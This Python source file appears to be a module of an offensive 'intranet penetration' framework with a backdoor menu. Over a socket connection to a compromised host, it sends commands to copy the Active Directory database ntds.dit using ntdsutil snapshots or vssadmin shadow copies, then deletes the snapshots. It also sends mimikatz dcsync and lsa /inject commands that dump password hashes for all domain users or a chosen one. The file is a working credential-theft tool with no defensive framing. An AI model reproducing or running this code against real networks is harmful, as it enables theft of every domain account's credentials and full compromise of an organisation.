import os
import sys
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
import struct

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable


class DomainControllerSecurity:
    def __init__(self, conn):
        commands = ["back", "show functions"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Domain Controller Security] \033[0m')
        while True:
            choice = prompt(formatted_text1, completer=completer)
            if choice.lower() == 'show functions':
                self.show_option()
                continue
            elif choice == 'back':
                break
            elif choice == '0':
                self.export_ntds(conn)
                continue
            elif choice == '1':
                self.read_data_from_ntds(conn)
                continue

    def show_option(self):
        print("\n" + '\033[1;34;34m' + "Domain Controller Security" + '\033[0m' + "\n" + '=' * len("Domain Controller Security") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["0", "export ntds.dit", "导出ntds.dit文件"], ["1", "read data from ntds.dit", "读取ntds.dit文件的数据"]]
        MyTable.createTable(headers, mydata)

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["domain_name", "域名"], ["username", "用户名"]]
        MyTable.createTable(headers, mydata)

    def export_ntds(self, conn):
        commands = ["back", "show functions"]
        completer = WordCompleter(commands)
        formatted_text = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Domain Controller Security/0] \033[0m')
        while True:
            try:
                choice = prompt(formatted_text, completer=completer)
                if choice == 'back':
                    break
                elif choice == "":
                    continue
                elif choice == 'show functions':
                    print("\n" + '\033[1;34;34m' + "Export ntds.dit" + '\033[0m' + "\n" + '=' * len("Export ntds.dit") + "\n")
                    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
                    mydata = [["0", "export ntds.dit by ntdsutil.exe", "0", "通过ntdsutil.exe导出ntds.dit"], ["1", "export ntds.dit by vssadmin", "1", "通过vssadmin导出ntds.dit"]]
                    MyTable.createTable(headers, mydata)
                elif choice == '0':
                    self.export_ntds_by_ntdsutil(conn)
                    continue
                elif choice == '1':
                    self.export_ntds_by_vssadmin(conn)
                    continue
            except IndexError:
                print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
                continue

    def read_data_from_ntds(self, conn):
        commands = ["back", "show functions", "show params"]
        completer = WordCompleter(commands)
        formatted_text = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Domain Controller Security/1] \033[0m')
        while True:
            try:
                choice = prompt(formatted_text, completer=completer)
                if choice == 'back':
                    break
                elif choice == "":
                    continue
                elif choice == 'show functions':
                    print("\n" + '\033[1;34;34m' + "Read data from ntds.dit" + '\033[0m' + "\n" + '=' * len("Read data from ntds.dit") + "\n")
                    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
                    mydata = [["0", "export all usernames and hash by mimikatz", "0 domain_name", "使用mimikatz导出域内的所有用户名及散列值"],
                              ["1", "export hash for specified user by mimikatz", "1 domain_name username", "导出指定用户的散列值"],
                              ["2", "Dump hash by dumping the lsass.exe process by mimikatz", "2", "通过转储lsass.exe进程对散列值进行Dump操作"]]
                    MyTable.createTable(headers, mydata)
                elif choice == 'show params':
                    self.show_params()
                    continue
                elif choice.split()[0] == '0':
                    command = "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:" + choice.split()[1] + " /all /csv\" exit"
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '1':
                    command = "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:" + choice.split()[1] + " /user:" + choice.split()[2] + "\" exit"
                    self.receive(conn, command)
                    continue
                elif choice.split()[0] == '2':
                    command = "mimikatz.exe \"privilege::debug\" \"lsadump::lsa /inject\" exit"
                    self.receive(conn, command)
                    continue
            except IndexError:
                print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
                continue

    # 通过ntdsutil.exe导出ntds.dit
    def export_ntds_by_ntdsutil(self, conn):
        print('\033[1;32;32m' + "[+] 创建快照:" + '\033[0m')
        command1 = "ntdsutil snapshot \"activate instance ntds\" create quit quit"
        self.receive(conn, command1)
        print('\033[1;32;32m' + "[+] 将快照加载到系统中:" + '\033[0m')
        guid = input("GUID > ")
        command2 = "ntdsutil snapshot \"mount {}\" quit quit".format(guid)
        self.receive(conn, command2)
        print('\033[1;32;32m' + "[+] 将快照文件复制到C盘下:" + '\033[0m')
        SNAP = input("$SNAP_xxx_VOLUMEC$ > ")
        command3 = "copy " + SNAP + "windows\\ntds\\ntds.dit C:\\"
        self.receive(conn, command3)
        print('\033[1;32;32m' + "[+] 将之前加载的快照卸载并删除:" + '\033[0m')
        command4 = "ntdsutil snapshot \"unmount {}\" \"delete {}\" quit quit".format(guid, guid)
        self.receive(conn, command4)

    # 通过vssadmin导出ntds.dit
    def export_ntds_by_vssadmin(self, conn):
        print('\033[1;32;32m' + "[+] 创建一个C盘的卷影拷贝:" + '\033[0m')
        command1 = "vssadmin create shadow /for=c:"
        self.receive(conn, command1)
        print('\033[1;32;32m' + "[+] 在创建的卷影中将ntds.dit复制出来:" + '\033[0m')
        shadow_copy_volume_name = input("Shadow Copy Volume Name > ")
        command2 = "copy " + shadow_copy_volume_name + "\\windows\\NTDS\\ntds.dit c:\\"
        self.receive(conn, command2)
        print('\033[1;32;32m' + "[+] 删除快照:" + '\033[0m')
        command4 = "vssadmin delete shadows /for=c: /quiet"
        self.receive(conn, command4)

    def receive(self, conn, command):
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break
